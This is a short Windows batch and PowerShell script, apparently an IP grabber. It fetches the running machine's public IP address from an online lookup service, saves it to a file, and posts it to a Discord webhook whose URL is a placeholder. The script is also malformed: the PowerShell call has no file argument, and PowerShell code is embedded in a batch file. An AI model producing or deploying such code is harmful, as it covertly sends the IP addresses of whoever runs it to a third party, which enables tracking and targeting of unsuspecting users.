@echo off
curl https://ip.aruljohn.com/ > ip.txt
Powershell.exe -executionpolicy remotesigned -File 

$webhookUri = 'https://discord.com/api/YourWebhookUrlHere'
$Body = @{
  'username' = Get-Content ip.txt
  'content' = Get-Content ip.txt
}
Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body